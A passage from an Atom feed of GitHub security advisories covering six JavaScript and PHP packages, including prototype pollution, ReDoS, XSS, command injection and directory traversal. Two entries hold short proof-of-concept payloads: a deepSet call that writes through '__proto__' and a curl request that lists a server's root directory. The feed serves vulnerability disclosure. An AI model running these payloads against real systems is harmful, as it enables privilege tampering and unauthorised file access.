        <published>2022-10-12T12:00:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mootools-more] mootools-more vulnerable to prototype pollution]]></title>
        <id>https://github.com/advisories/GHSA-fw45-938v-p26j</id>
        <link href="https://github.com/advisories/GHSA-fw45-938v-p26j"/>
        <updated>2024-04-22T23:15:05.000Z</updated>
        <content type="html"><![CDATA[<p>Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') in mootools-more 1.6.0 allows a malicious user to inject properties into Object.prototype.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-20088">https://nvd.nist.gov/vuln/detail/CVE-2021-20088</a></li>
<li><a href="https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/mootools-more.md">https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/mootools-more.md</a></li>
<li><a href="https://github.com/advisories/GHSA-fw45-938v-p26j">https://github.com/advisories/GHSA-fw45-938v-p26j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fw45-938v-p26j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T22:01:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckeditor4-dev] CKEditor 4 ReDoS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jv4c-7jqq-m34x</id>
        <link href="https://github.com/advisories/GHSA-jv4c-7jqq-m34x"/>
        <updated>2024-04-22T23:14:44.000Z</updated>
        <content type="html"><![CDATA[<p>It was possible to execute a ReDoS-type attack inside CKEditor 4 before 4.16 by persuading a victim to paste crafted text into the Styles input of specific dialogs (in the Advanced Tab for Dialogs plugin).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26271">https://nvd.nist.gov/vuln/detail/CVE-2021-26271</a></li>
<li><a href="https://github.com/ckeditor/ckeditor4/blob/major/CHANGES.md#ckeditor-416">https://github.com/ckeditor/ckeditor4/blob/major/CHANGES.md#ckeditor-416</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://web.archive.org/web/20210128132707/https://ckeditor.com/blog/CKEditor-4.16-with-improved-image-pasting-High-Contrast-support-and-a-new-color-API/#security-comes-first">https://web.archive.org/web/20210128132707/https://ckeditor.com/blog/CKEditor-4.16-with-improved-image-pasting-High-Contrast-support-and-a-new-color-API/#security-comes-first</a></li>
<li><a href="https://github.com/advisories/GHSA-jv4c-7jqq-m34x">https://github.com/advisories/GHSA-jv4c-7jqq-m34x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jv4c-7jqq-m34x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:40:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deep-set] Prototype pollution vulnerability in 'deep-set']]></title>
        <id>https://github.com/advisories/GHSA-wgxm-rg53-h2c6</id>
        <link href="https://github.com/advisories/GHSA-wgxm-rg53-h2c6"/>
        <updated>2024-04-22T23:14:17.000Z</updated>
        <content type="html"><![CDATA[<p>The NPM module 'deep-set' can be abused by Prototype Pollution vulnerability since the function <code>deepSet()</code> does not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">var deepSet = require('deep-set')
var obj = {'1':'2'}
console.log(obj.isAdmin);
deepSet(obj, '__proto__.isAdmin', 'true')
console.log(obj.isAdmin);
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28276">https://nvd.nist.gov/vuln/detail/CVE-2020-28276</a></li>
<li><a href="https://github.com/klaemo/deep-set/blob/103d650b3de1f5c6cf051236347ba59e7274cd07/index.js#L39">https://github.com/klaemo/deep-set/blob/103d650b3de1f5c6cf051236347ba59e7274cd07/index.js#L39</a></li>
<li><a href="https://web.archive.org/web/20210320110509/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276">https://web.archive.org/web/20210320110509/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276</a></li>
<li><a href="https://github.com/advisories/GHSA-wgxm-rg53-h2c6">https://github.com/advisories/GHSA-wgxm-rg53-h2c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgxm-rg53-h2c6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T17:37:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[shiba] Shiba vulnerable to XSS leading to code execution]]></title>
        <id>https://github.com/advisories/GHSA-jr64-pggr-j8xj</id>
        <link href="https://github.com/advisories/GHSA-jr64-pggr-j8xj"/>
        <updated>2024-04-22T23:11:43.000Z</updated>
        <content type="html"><![CDATA[<p>Shiba markdown live preview app version 1.1.0 is vulnerable to XSS which leads to code execution due to enabled node integration.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000491">https://nvd.nist.gov/vuln/detail/CVE-2017-1000491</a></li>
<li><a href="https://github.com/rhysd/Shiba/issues/42">https://github.com/rhysd/Shiba/issues/42</a></li>
<li><a href="https://github.com/rhysd/Shiba/commit/e8a65b0f81eb04903eedd29500d7e1bedf249eab">https://github.com/rhysd/Shiba/commit/e8a65b0f81eb04903eedd29500d7e1bedf249eab</a></li>
<li><a href="https://github.com/advisories/GHSA-jr64-pggr-j8xj">https://github.com/advisories/GHSA-jr64-pggr-j8xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr64-pggr-j8xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T03:49:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[promise-probe] promise-probe OS command injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vmqq-7qvx-68qx</id>
        <link href="https://github.com/advisories/GHSA-vmqq-7qvx-68qx"/>
        <updated>2024-04-22T23:09:42.000Z</updated>
        <content type="html"><![CDATA[<p>promise-probe before 0.10.0 allows remote attackers to perform a command injection attack. The <code>file</code>, <code>outputFile</code> and <code>options</code> functions can be controlled by users without any sanitization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10791">https://nvd.nist.gov/vuln/detail/CVE-2019-10791</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816">https://snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816</a></li>
<li><a href="https://github.com/dottgonzo/node-promise-probe/commit/0d9affb67fc1ad985903536d35372cf55efe5a45">https://github.com/dottgonzo/node-promise-probe/commit/0d9affb67fc1ad985903536d35372cf55efe5a45</a></li>
<li><a href="https://github.com/advisories/GHSA-vmqq-7qvx-68qx">https://github.com/advisories/GHSA-vmqq-7qvx-68qx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vmqq-7qvx-68qx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-24T17:09:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jqueryfiletree] jqueryFileTree vulnerable to Directory Traversal]]></title>
        <id>https://github.com/advisories/GHSA-p739-9479-5wr2</id>
        <link href="https://github.com/advisories/GHSA-p739-9479-5wr2"/>
        <updated>2024-04-22T23:09:06.000Z</updated>
        <content type="html"><![CDATA[<p>jqueryFileTree 2.1.5 and older is vulnerable to Directory Traversal</p>
<h3 id="poc">POC:</h3>
<pre><code class="language-bash">curl 'http://localhost:8000/js/jqueryfiletree-2.1.5/dist/connectors/jqueryFileTree.php' -H 'Referer: xxx' -d "dir=/"
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000170">https://nvd.nist.gov/vuln/detail/CVE-2017-1000170</a></li>
<li><a href="https://github.com/jqueryfiletree/jqueryfiletree/issues/66">https://github.com/jqueryfiletree/jqueryfiletree/issues/66</a></li>
<li><a href="http://packetstormsecurity.com/files/161900/WordPress-Delightful-Downloads-Jquery-File-Tree-1.6.6-Path-Traversal.html">http://packetstormsecurity.com/files/161900/WordPress-Delightful-Downloads-Jquery-File-Tree-1.6.6-Path-Traversal.html</a></li>
<li><a href="https://github.com/advisories/GHSA-p739-9479-5wr2">https://github.com/advisories/GHSA-p739-9479-5wr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p739-9479-5wr2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:11:22.000Z</published>
    </entry>
</feed>